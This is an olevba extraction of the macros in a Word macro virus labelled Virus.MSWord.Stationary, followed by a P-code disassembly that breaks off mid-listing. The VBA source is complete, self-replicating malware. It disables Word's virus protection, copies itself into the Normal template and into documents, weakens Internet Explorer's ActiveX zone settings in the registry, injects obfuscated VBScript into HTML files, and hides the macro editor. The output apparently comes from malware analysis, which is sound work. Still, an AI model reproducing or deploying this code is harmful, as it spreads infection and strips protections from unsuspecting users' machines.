olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stationary
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stationary - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Stationery
'by CyberShadow//SMF
Private Sub Document_Close()
 With Application
  .EnableCancelKey = False
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 If NT.Lines(1, 1) <> "'Stationery" Then
  NT.DeleteLines 1, NT.CountOfLines
  NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
 End If
 If AD.Lines(1, 1) <> "'Stationery" Then
  AD.DeleteLines 1, AD.CountOfLines
  AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
 End If
 CrStr = getname()
 Call compile(CryptedString, CrStr)
 Call CorrectLine(CryptedString, CrStr)
 a = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery", "Stationery Folder") + "\"
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
 System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
 Call infectHTML(a, CryptedString, CrStr)
End Sub
Private Sub infectHTML(a, CryptedString, CrStr)
 With Application.FileSearch
  .FileName = "*.htm"
  .MatchAllWordForms = True
  .LookIn = a
  .SearchSubFolders = True
  .Execute
  For i = 1 To .FoundFiles.Count
   c = .FoundFiles(i)
   Open c For Input As 1
    If LOF(1) > 55000 Then GoTo ExitRead
    e = ""
    Do While Not EOF(1)
     Line Input #1, a2
     d = a2
     If Len(d) >= 3 Then
      b = UCase(d)
      If b = "<HTML> <CYBERSHADOW...>" Then GoTo ExitRead
      If b = "<HTML>" Then b = "<html> <CyberShadow...>": d = b
      For j = 1 To Len(b) - 6
       If Mid$(b, j, 8) = "</BODY>" Then
        d = Left$(b, j + 7) + Chr$(13) + Chr$(10)
        d = d + "<body>" + Chr$(13) + Chr$(10)
        d = d + "<script language=""VBScript"">" + Chr$(13) + Chr$(10)
        d = d + "<!--" + Chr$(13) + Chr$(10)
        d = d + "On Error Resume Next" + Chr$(13) + Chr$(10)
        d = d + CryptedString + Chr$(13) + Chr$(10)
        d = d + "Dim FSO" + Chr$(13) + Chr$(10)
        d = d + "Set FSO = CreateObject(""Scripting.FileSystemObject"")" + Chr$(13) + Chr$(10)
        d = d + "Set WordObj = GetObject("""", ""Word.Application""): Quit = 0" + Chr$(13) + Chr$(10)
        d = d + "If WordObj = """" Then" + Chr$(13) + Chr$(10)
        d = d + "Set WordObj = CreateObject(""Word.Application""): Quit = 1" + Chr$(13) + Chr$(10)
        d = d + "End If" + Chr$(13) + Chr$(10)
        d = d + "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule" + Chr$(13) + Chr$(10)
        d = d + "If NT.Lines(1, 1) <> ""'Stationery"" Then" + Chr$(13) + Chr$(10)
        d = d + "WordObj.Options.SaveNormalPrompt = False" + Chr$(13) + Chr$(10)
        d = d + "NT.DeleteLines 1, NT.CountOfLines" + Chr$(13) + Chr$(10)
        d = d + "NT.InsertLines 1," + CrStr + Chr$(13) + Chr$(10)
        d = d + "End If" + Chr$(13) + Chr$(10)
        d = d + "Set NT = Nothing" + Chr$(13) + Chr$(10)
        d = d + "If Quit = 1 Then WordObj.Quit" + Chr$(13) + Chr$(10)
        d = d + "--></script>" + Chr$(13) + Chr$(10)
        d = d + "</body>" + Chr$(13) + Chr$(10)
        j = j + 7
        If (Len(b) - j - 7) > 0 Then d = d + Right$(b, Len(b) - j - 7)
       End If
      Next
     End If
     e = e + d + Chr$(13) + Chr$(10)
    Loop
    Close #1
    Open c For Output As 1
     Print #1, e
ExitRead:
   Close #1
  Next i
 End With
End Sub
Private Sub CorrectLine(CryptedString, CrStr)
 maxlen = Int(Rnd * 100) + 100
 c = "": l = 0: f2 = -1
 For i = 1 To Len(CryptedString)
  b = Mid$(CryptedString, i, 1)
  If b = """" Then f2 = -f2
  If l > maxlen And f2 = 1 Then
   c = c + """"
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr + "+""": l = Len(c)
  End If
  If b = "+" And l >= maxlen Then
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr: l = Len(c)
  End If
  c = c + b: l = l + 1
 Next
 CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
 CryptedString = CryptedS
End Sub
Private Function getname()
 c = ""
 For i = 1 To Int(Rnd * 7) + 1
  b = Int(Rnd * 26) + 65
  If Rnd > 0.5 Then b = b + 32
  c = c + Chr$(b)
 Next
 c = c + Chr$(Asc("0") + Int(Rnd * 9))
 getname = c
End Function
Private Sub compile(CryptedString, CrStr)
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 a = AD.Lines(1, AD.CountOfLines)
 CryptedString = CrStr + "="
 fl = 0
 For i = 1 To Len(a)
  b = Asc(Mid$(a, i, 1))
  If (b < 33) Or b = Asc("""") Or b = Asc("+") Or b = Asc("_") Or b = Asc("^") Or b = Asc(">") Or b = Asc("<") Then
    If fl = 1 Then CryptedString = CryptedString + """"
    CryptedString = CryptedString + "+chr(" + Str$(b) + ") ": fl = 0
   Else
    If fl = 0 Then
     If Mid$(CryptedString, Len(CryptedString) - 1, 1) = ")" Then CryptedString = CryptedString + "+"
     CryptedString = CryptedString + """"
    End If
    CryptedString = CryptedString + Chr$(b): fl = 1
  End If
 Next
 If Mid$(CryptedString, Len(CryptedString) - 1, 1) <> " " And Mid$(CryptedString, Len(CryptedString) - 1, 1) <> ")" Then CryptedString = CryptedString + """"
End Sub
Private Sub ViewVBCode(): Stealth: End Sub
Private Sub ToolsMacro(): Stealth: End Sub
Private Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth()
On Error Resume Next
Application.ShowVisualBasicEditor = 0
Application.EnableCancelKey = 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Stationary
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10653 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000A "Stationery"
' Line #1:
' 	QuoteRem 0x0000 0x0013 "by CyberShadow//SMF"
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	MemStWith EnableCancelKey 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith ShowVisualBasicEditor 
' Line #7:
' 	EndWith 
' Line #8:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #9:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #12:
' 	EndWith 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "'Stationery"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "'Stationery"
' 	Ne 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	ArgsLd getname 0x0000 
' 	St CrStr 
' Line #24:
' 	Ld CryptedString 
' 	Ld CrStr 
' 	ArgsCall (Call) compile 0x0002 
' Line #25:
' 	Ld CryptedString 
' 	Ld CrStr 
' 	ArgsCall (Call) CorrectLine 0x0002 
' Line #26:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery"
' 	LitStr 0x0011 "Stationery Folder"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St a 
' Line #27:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x0004 "1201"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0056 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x0004 "1201"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #29:
' 	Ld a 
' 	Ld CryptedString 
' 	Ld CrStr 
' 	ArgsCall (Call) infectHTML 0x0003 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Private Sub infectHTML(a, CryptedString, CrStr))
' Line #32:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #33:
' 	LitStr 0x0005 "*.htm"
' 	MemStWith FileName 
' Line #34:
' 	LitVarSpecial (True)
' 	MemStWith MatchAllWordForms 
' Line #35:
' 	Ld a 
' 	MemStWith LookIn 
' Line #36:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #37:
' 	ArgsMemCallWith Execute 0x0000 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #39:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St c 
' Line #40:
' 	Ld c 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Input)
' Line #41:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI4 0xD6D8 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo ExitRead 
' 	EndIf 
' Line #42:
' 	LitStr 0x0000 ""
' 	St e 
' Line #43:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld a2 
' 	LineInput 
' Line #45:
' 	Ld a2 
' 	St d 
' Line #46:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Ge 
' 	IfBlock 
' Line #47:
' 	Ld d 
' 	ArgsLd UCase 0x0001 
' 	St B 
' Line #48:
' 	Ld B 
' 	LitStr 0x0017 "<HTML> <CYBERSHADOW...>"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ExitRead 
' 	EndIf 
' Line #49:
' 	Ld B 
' 	LitStr 0x0006 "<HTML>"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "<html> <CyberShadow...>"
' 	St B 
' 	BoS 0x0000 
' 	Ld B 
' 	St d 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld B 
' 	FnLen 
' 	LitDI2 0x0006 
' 	Sub 
' 	For 
' Line #51:
' 	Ld B 
' 	Ld j 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0007 "</BODY>"
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld B 
' 	Ld j 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd LBound$ 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #53:
' 	Ld d 
' 	LitStr 0x0006 "<body>"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #54:
' 	Ld d 
' 	LitStr 0x001C "<script language="VBScript">"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #55:
' 	Ld d 
' 	LitStr 0x0004 "<!--"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #56:
' 	Ld d 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #57:
' 	Ld d 
' 	Ld CryptedString 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #58:
' 	Ld d 
' 	LitStr 0x0007 "Dim FSO"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #59:
' 	Ld d 
' 	LitStr 0x0034 "Set FSO = CreateObject("Scripting.FileSystemObject")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #60:
' 	Ld d 
' 	LitStr 0x0039 "Set WordObj = GetObject("", "Word.Application"): Quit = 0"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #61:
' 	Ld d 
' 	LitStr 0x0014 "If WordObj = "" Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #62:
' 	Ld d 
' 	LitStr 0x0038 "Set WordObj = CreateObject("Word.Application"): Quit = 1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #63:
' 	Ld d 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #64:
' 	Ld d 
' 	LitStr 0x0042 "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #65:
' 	Ld d 
' 	LitStr 0x0027 "If NT.Lines(1, 1) <> "'Stationery" Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #66:
' 	Ld d 
' 	LitStr 0x0028 "WordObj.Options.SaveNormalPrompt = False"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #67:
' 	Ld d 
' 	LitStr 0x0021 "NT.DeleteLines 1, NT.CountOfLines"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #68:
' 	Ld d 
' 	LitStr 0x0011 "NT.InsertLines 1,"
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #69:
' 	Ld d 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #70:
' 	Ld d 
' 	LitStr 0x0010 "Set NT = Nothing"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #71:
' 	Ld d 
' 	LitStr 0x001D "If Quit = 1 Then WordObj.Quit"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #72:
' 	Ld d 
' 	LitStr 0x000C "--></script>"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #73:
' 	Ld d 
' 	LitStr 0x0007 "</body>"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #74:
' 	Ld j 
' 	LitDI2 0x0007 
' 	Add 
' 	St j 
' Line #75:
' 	Ld B 
' 	FnLen 
' 	Ld j 
' 	Sub 
' 	LitDI2 0x0007 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld d 
' 	Ld B 
' 	Ld B 
' 	FnLen 
' 	Ld j 
' 	Sub 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	Add 
' 	St d 
' 	EndIf 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	Ld e 
' 	Ld d 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St e 
' Line #80:
' 	Loop 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #82:
' 	Ld c 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld e 
' 	PrintItemNL 
' Line #84:
' 	Label ExitRead 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #86:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	EndWith 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Sub CorrectLine(CryptedString, CrStr))
' Line #90:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #91:
' 	LitStr 0x0000 ""
' 	St c 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St l 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	St f2 
' Line #92:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CryptedString 
' 	FnLen 
' 	For 
' Line #93:
' 	Ld CryptedString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B 
' Line #94:
' 	Ld B 
' 	LitStr 0x0001 """
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld f2 
' 	UMi 
' 	St f2 
' 	EndIf 
' Line #95:
' 	Ld l 
' 	Ld maxlen 
' 	Gt 
' 	Ld f2 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #96:
' 	Ld c 
' 	LitStr 0x0001 """
' 	Add 
' 	St c 
' Line #97:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #98:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #99:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0002 "+""
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld c 
' 	FnLen 
' 	St l 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld B 
' 	LitStr 0x0001 "+"
' 	Eq 
' 	Ld l 
' 	Ld maxlen 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #102:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #103:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #104:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld c 
' 	FnLen 
' 	St l 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld c 
' 	Ld B 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #107:
' 	StartForVariable 
' 	Next 
' Line #108:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #109:
' 	Ld CryptedS 
' 	St CryptedString 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Private Function getname(id_FFFE As Variant))
' Line #112:
' 	LitStr 0x0000 ""
' 	St c 
' Line #113:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #114:
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	St B 
' Line #115:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	LitDI2 0x0020 
' 	Add 
' 	St B 
' 	EndIf 
' Line #116:
' 	Ld c 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #117:
' 	StartForVariable 
' 	Next 
' Line #118:
' 	Ld c 
' 	LitStr 0x0001 "0"
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #119:
' 	Ld c 
' 	St getname 
' Line #120:
' 	EndFunc 
' Line #121:
' 	FuncDefn (Private Sub compile(CryptedString, CrStr))
' Line #122:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #123:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #124:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	St CryptedString 
' Line #125:
' 	LitDI2 0x0000 
' 	St fl 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	For 
' Line #127:
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St B 
' Line #128:
' 	Ld B 
' 	LitDI2 0x0021 
' 	Lt 
' 	Paren 
' 	Ld B 
' 	LitStr 0x0001 """
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "+"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "_"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "^"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 ">"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "<"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #129:
' 	Ld fl 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #130:
' 	Ld CryptedString 
' 	LitStr 0x0005 "+chr("
' 	Add 
' 	Ld B 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0002 ") "
' 	Add 
' 	St CryptedString 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St fl 
' Line #131:
' 	ElseBlock 
' Line #132:
' 	Ld fl 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #133:
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ")"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 "+"
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #134:
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	Ld CryptedString 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedString 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St fl 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	StartForVariable 
' 	Next 
' Line #139:
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Ne 
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ")"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
